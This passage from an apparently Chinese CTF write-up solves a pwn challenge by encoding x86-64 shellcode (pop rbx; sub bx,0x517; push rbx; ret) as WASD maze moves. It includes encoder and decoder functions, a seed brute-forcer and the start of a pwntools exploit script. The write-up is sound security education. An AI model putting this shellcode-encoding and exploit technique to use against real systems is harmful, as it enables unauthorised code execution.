class="comment"># 记录有效指令</span></span><br><span class="line">        valid_instructions.append(char)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 1. 移位并合并：将当前 byte 向左移动 2 位，然后合并新代码</span></span><br><span class="line">        <span class="comment"># 实现 MSB 优先 (高位先写入) 的打包</span></span><br><span class="line">        current_byte = (current_byte &lt;&lt; <span class="number">2</span>) | code</span><br><span class="line">        bit_count += <span class="number">2</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 2. 检查是否填满一个完整的字节 (8 位)</span></span><br><span class="line">        <span class="keyword">if</span> bit_count == <span class="number">8</span>:</span><br><span class="line">            encoded_bytes.append(current_byte)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 重置用于下一个字节的编码</span></span><br><span class="line">            current_byte = <span class="number">0</span></span><br><span class="line">            bit_count = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># --- 2. 处理剩余未满 8 位的指令 (如果存在) ---</span></span><br><span class="line">    <span class="keyword">if</span> bit_count &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 将剩余的 bits 左移，使其对齐到字节的高位 (MSB) </span></span><br><span class="line">        <span class="comment"># 低位 (LSB) 用 0 填充</span></span><br><span class="line">        current_byte &lt;&lt;= (<span class="number">8</span> - bit_count)</span><br><span class="line">        encoded_bytes.append(current_byte)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># --- 3. 日志阶段：按字节和按 4 字节的行打印 ---</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"\n--- WASD Bytecode Encoding Log ---"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 每个字节包含 4 个指令</span></span><br><span class="line">    INSTRUCTIONS_PER_BYTE = <span class="number">4</span></span><br><span class="line">    </span><br><span class="line">    num_bytes = <span class="built_in">len</span>(encoded_bytes)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_bytes):</span><br><span class="line">        byte_val = encoded_bytes[i]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算当前字节对应的指令在有效指令列表中的起始和结束索引</span></span><br><span class="line">        start_instr_index = i * INSTRUCTIONS_PER_BYTE</span><br><span class="line">        end_instr_index = start_instr_index + INSTRUCTIONS_PER_BYTE</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 截取已编码的指令序列</span></span><br><span class="line">        instr_segment = <span class="string">""</span>.join(valid_instructions[start_instr_index:end_instr_index])</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果是最后一个字节且不满 4 个指令，使用 '?' 填充到 4 位 (匹配原解码器日志)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(instr_segment) &lt; INSTRUCTIONS_PER_BYTE:</span><br><span class="line">            padding_count = INSTRUCTIONS_PER_BYTE - <span class="built_in">len</span>(instr_segment)</span><br><span class="line">            instr_segment += <span class="string">'?'</span> * padding_count</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 格式化输出 (字节值和指令)</span></span><br><span class="line">        byte_log = <span class="string">f"Byte <span class="subst">{i:02d}</span> (<span class="subst">{byte_val:02X}</span>h): <span class="subst">{instr_segment:&lt;<span class="number">4</span>}</span>"</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印：每 4 个字节打印一行</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 打印当前字节的日志，使用空格分隔</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"<span class="subst">{byte_log}</span>    "</span>, end=<span class="string">""</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 打印日志结束后的换行符</span></span><br><span class="line">    <span class="keyword">if</span> num_bytes &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"----------------------------------"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># --- 4. 返回最终编码结果 ---</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(encoded_bytes)</span><br></pre></td></tr></table></figure>
<p>另一个是将shellcode转义为wasd串：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_wasd_from_bytecode_auto</span>(<span class="params">bytecode_bytes: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 核心映射表</span></span><br><span class="line">    CODE_MAP = {</span><br><span class="line">        <span class="number">0b00</span>: <span class="string">'w'</span>,</span><br><span class="line">        <span class="number">0b01</span>: <span class="string">'d'</span>,</span><br><span class="line">        <span class="number">0b10</span>: <span class="string">'s'</span>,</span><br><span class="line">        <span class="number">0b11</span>: <span class="string">'a'</span>,</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    decoded_chars = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># --- 1. 解码阶段：按 2 位逐位提取指令 ---</span></span><br><span class="line">    </span><br><span class="line">    total_bits = <span class="built_in">len</span>(bytecode_bytes) * <span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> bit_pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, total_bits, <span class="number">2</span>):</span><br><span class="line">        <span class="comment"># 优化：只需一次计算即可提取 2 位指令</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 确定包含当前指令第 1 位的字节索引</span></span><br><span class="line">        byte_index = bit_pos // <span class="number">8</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 确定当前指令第 1 位在字节中的位索引 (从 MSB=7 到 LSB=0)</span></span><br><span class="line">        bit_in_byte = <span class="number">7</span> - (bit_pos % <span class="number">8</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 提取第一个位 (bit1)</span></span><br><span class="line">        byte_val = bytecode_bytes[byte_index]</span><br><span class="line">        bit1 = (byte_val &gt;&gt; bit_in_byte) &amp; <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 提取第二个位 (bit2)</span></span><br><span class="line">        bit_pos_2 = bit_pos + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查是否跨字节</span></span><br><span class="line">        <span class="keyword">if</span> bit_in_byte == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 跨字节了，bit2 在下一个字节的 MSB (索引 7)</span></span><br><span class="line">            byte_index_2 = byte_index + <span class="number">1</span></span><br><span class="line">            <span class="comment"># 如果字节码长度不是 2 的倍数（按字节），且 bit2 越界，跳出</span></span><br><span class="line">            <span class="keyword">if</span> byte_index_2 &gt;= <span class="built_in">len</span>(bytecode_bytes):</span><br><span class="line">                 <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            byte_val_2 = bytecode_bytes[byte_index_2]</span><br><span class="line">            bit2 = (byte_val_2 &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span> <span class="comment"># bit_in_byte_2 总是 7</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 未跨字节，bit2 就在当前字节 bit1 的右侧</span></span><br><span class="line">            bit2 = (byte_val &gt;&gt; (bit_in_byte - <span class="number">1</span>)) &amp; <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        current_code = (bit1 &lt;&lt; <span class="number">1</span>) | bit2</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 解码并添加结果</span></span><br><span class="line">        decoded_chars.append(CODE_MAP.get(current_code, <span class="string">'?'</span>)) <span class="comment"># 使用 get 处理可能的错误码</span></span><br><span class="line">            </span><br><span class="line">    <span class="comment"># --- 2. 日志阶段：按字节和按 4 字节的行打印 ---</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"--- WASD Bytecode Log ---"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 每个字节包含 4 个指令 (8 位 / 2 位/指令 = 4 指令)</span></span><br><span class="line">    INSTRUCTIONS_PER_BYTE = <span class="number">4</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bytecode_bytes)):</span><br><span class="line">        byte_val = bytecode_bytes[i]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 提取当前字节对应的 4 个指令</span></span><br><span class="line">        start_instr_index = i * INSTRUCTIONS_PER_BYTE</span><br><span class="line">        end_instr_index = start_instr_index + INSTRUCTIONS_PER_BYTE</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 截取已解码的指令序列</span></span><br><span class="line">        instr_segment = <span class="string">""</span>.join(decoded_chars[start_instr_index:end_instr_index])</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 格式化输出 (字节值和指令)</span></span><br><span class="line">        byte_log = <span class="string">f"Byte <span class="subst">{i:02d}</span> (<span class="subst">{byte_val:02X}</span>h): <span class="subst">{instr_segment:&lt;<span class="number">4</span>}</span>"</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印：每 4 个字节打印一行</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 在新行开始前打印换行符</span></span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 打印当前字节的日志，使用制表符或空格分隔</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"<span class="subst">{byte_log}</span>    "</span>, end=<span class="string">""</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 打印日志结束后的换行符</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(bytecode_bytes) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"-------------------------"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># --- 3. 返回最终解码结果 ---</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(decoded_chars)</span><br></pre></td></tr></table></figure>
<p>明确我们的shellcode最短是三条指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop rbx</span><br><span class="line">sub bx, 0x517</span><br><span class="line">jmp rbx</span><br></pre></td></tr></table></figure>
<p>但在实际操作中，<code>jmp</code>指令实在不好找对应的连续步，所以我们把jmp指令拆成两步，即：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop rbx</span><br><span class="line">sub bx, 0x517</span><br><span class="line">push rbx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>现在明确，每一条汇编指令都是原子的，即不可拆分的，必须是连续的。但指令和指令之间是可以拆分的，<strong>即我们可以在两条指令之间插入一些毫不相干的指令进行当前位置的调整，来保证执行下一条指令时，每一步在迷宫里都是合法的。</strong></p>
<p>在此之前，我们希望迷宫里尽可能空旷来给我们发挥的空间，看了下程序里生成迷宫的算法，喂给AI好像是什么线性移位寄存器，不管了，我们写一个爆破的函数，不断去爆破seed找到迷宫里障碍物尽可能少的种子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_maze</span>():</span><br><span class="line">    <span class="keyword">global</span> min_default, min_seed</span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    seed = random.randint(<span class="number">0</span>, <span class="number">0x7fffffff</span>)</span><br><span class="line">    sla(<span class="string">b"Enter seed:"</span>, <span class="built_in">str</span>(seed))</span><br><span class="line">    response = p.recvuntil(<span class="string">b"Enter move (w/a/s/d):"</span>)</span><br><span class="line">    default_num = response.count(<span class="string">b"#"</span>)</span><br><span class="line">    <span class="built_in">print</span>(default_num)</span><br><span class="line">    <span class="keyword">if</span> default_num &lt;= min_default:</span><br><span class="line">        min_default = default_num</span><br><span class="line">        min_seed = seed</span><br></pre></td></tr></table></figure>
<p>总共爆破出来了好几个种子，障碍物总数在11-13不等，经过挑选我选择了<code>1866723839</code>这个种子：</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251126153530895.png"></p>
<p>这个种子生成的迷宫下面有一大片连续的空地可以发挥，现在我们需要去找一些调整P位置的指令：</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">rex</span> -&gt;</span> <span class="function"><span class="title">dwww</span>   rex.W -&gt;</span> <span class="function"><span class="title">dwsw</span>  pop rax -&gt;</span> <span class="function"><span class="title">ddsw</span> clc -&gt;</span> aasw</span><br></pre></td></tr></table></figure>
<p>我们用这四条指令穿插在原本的shellcode中，保证每一条指令的连续步都合法，最终的shellcode长这个样子：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rex</span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rbx</span></span><br><span class="line"><span class="keyword">clc</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line"><span class="keyword">clc</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line">rex<span class="number">.</span>W</span><br><span class="line"><span class="keyword">sub</span> <span class="built_in">bx</span>, <span class="number">0x517</span></span><br><span class="line"><span class="keyword">clc</span></span><br><span class="line"><span class="keyword">clc</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">rbx</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
<p>最终的连续步是这样的：</p>
<p><code>dwwwddsaaaswddswaaswddswdwswdsdsswwdassawddawwddaaswaaswddwadwswawwa</code></p>
<p>本题exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_wasd_from_bytecode_auto</span>(<span class="params">bytecode_bytes: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 核心映射表</span></span><br><span class="line">    CODE_MAP = {</span><br><span class="line">        <span class="number">0b00</span>: <span class="string">'w'</span>,</span><br><span class="line">        <span class="number">0b01</span>: <span class="string">'d'</span>,</span><br><span class="line">        <span class="number">0b10</span>: <span class="string">'s'</span>,</span><br><span class="line">        <span class="number">0b11</span>: <span class="string">'a'</span>,</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    decoded_chars = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># --- 1. 解码阶段：按 2 位逐位提取指令 ---</span></span><br><span class="line">    </span><br><span class="line">    total_bits = <span class="built_in">len</span>(bytecode_bytes) * <span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> bit_pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, total_bits, <span class="number">2</span>):</span><br><span class="line">        <span class="comment"># 优化：只需一次计算即可提取 2 位指令</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 确定包含当前指令第 1 位的字节索引</span></span><br><span class="line">        byte_index = bit_pos // <span class="number">8</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 确定当前指令第 1 位在字节中的位索引 (从 MSB=7 到 LSB=0)</span></span><br><span class="line">        bit_in_byte = <span class="number">7</span> - (bit_pos % <span class="number">8</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 提取第一个位 (bit1)</span></span><br><span class="line">        byte_val = bytecode_bytes[byte_index]</span><br><span class="line">        bit1 = (byte_val &gt;&gt; bit_in_byte) &amp; <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 提取第二个位 (bit2)</span></span><br><span class="line">        bit_pos_2 = bit_pos + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查是否跨字节</span></span><br><span class="line">        <span class="keyword">if</span> bit_in_byte == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 跨字节了，bit2 在下一个字节的 MSB (索引 7)</span></span><br><span class="line">            byte_index_2 = byte_index + <span class="number">1</span></span><br><span class="line">            <span class="comment"># 如果字节码长度不是 2 的倍数（按字节），且 bit2 越界，跳出</span></span><br><span class="line">            <span class="keyword">if</span> byte_index_2 &gt;= <span class="built_in">len</span>(bytecode_bytes):</span><br><span class="line">                 <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            byte_val_2 = bytecode_bytes[byte_index_2]</span><br><span class="line">            bit2 = (byte_val_2 &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span> <span class="comment"># bit_in_byte_2 总是 7</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 未跨字节，bit2 就在当前字节 bit1 的右侧</span></span><br><span class="line">            bit2 = (byte_val &gt;&gt; (bit_in_byte - <span class="number">1</span>)) &amp; <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        current_code = (bit1 &lt;&lt; <span class="number">1</span>) | bit2</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 解码并添加结果</span></span><br><span class="line">        decoded_chars.append(CODE_MAP.get(current_code, <span class="string">'?'</span>)) <span class="comment"># 使用 get 处理可能的错误码</span></span><br><span class="line">            </span><br><span class="line">    <span class="comment"># --- 2. 日志阶段：按字节和按 4 字节的行打印 ---</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"--- WASD Bytecode Log ---"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 每个字节包含 4 个指令 (8 位 / 2 位/指令 = 4 指令)</span></span><br><span class="line">    INSTRUCTIONS_PER_BYTE = <span class="number">4</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bytecode_bytes)):</span><br><span class="line">        byte_val = bytecode_bytes[i]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 提取当前字节对应的 4 个指令</span></span><br><span class="line">        start_instr_index = i * INSTRUCTIONS_PER_BYTE</span><br><span class="line">        end_instr_index = start_instr_index + INSTRUCTIONS_PER_BYTE</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 截取已解码的指令序列</span></span><br><span class="line">        instr_segment = <span class="string">""</span>.join(decoded_chars[start_instr_index:end_instr_index])</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 格式化输出 (字节值和指令)</span></span><br><span class="line">        byte_log = <span class="string">f"Byte <span class="subst">{i:02d}</span> (<span class="subst">{byte_val:02X}</span>h): <span class="subst">{instr_segment:&lt;<span class="number">4</span>}</span>"</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印：每 4 个字节打印一行</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 在新行开始前打印换行符</span></span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 打印当前字节的日志，使用制表符或空格分隔</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"<span class="subst">{byte_log}</span>    "</span>, end=<span class="string">""</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 打印日志结束后的换行符</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(bytecode_bytes) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"-------------------------"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># --- 3. 返回最终解码结果 ---</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(decoded_chars)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_wasd_to_bytecode</span>(<span class="params">wasd_string: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 核心编码映射表</span></span><br><span class="line">    CODE_MAP = {</span><br><span class="line">        <span class="string">'w'</span>: <span class="number">0b00</span>,</span><br><span class="line">        <span class="string">'d'</span>: <span class="number">0b01</span>,</span><br><span class="line">        <span class="string">'s'</span>: <span class="number">0b10</span>,</span><br><span class="line">        <span class="string">'a'</span>: <span class="number">0b11</span>,</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    encoded_bytes: <span class="type">List</span>[<span class="built_in">int</span>] = []</span><br><span class="line">    </span><br><span class="line">    current_byte = <span class="number">0</span></span><br><span class="line">    bit_count = <span class="number">0</span> <span class="comment"># 当前 byte 中已填充的位数 (0, 2, 4, 6)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 原始指令列表 (用于日志，已过滤非法字符并转为小写)</span></span><br><span class="line">    valid_instructions: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># --- 1. 编码阶段：按 2 位逐位打包指令 ---</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(wasd_string.lower()):</span><br><span class="line">        <span class="comment"># 查找 2-bit 代码</span></span><br><span class="line">        code = CODE_MAP.get(char)</span><br><span class="line">        <span class="keyword">if</span> code <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span 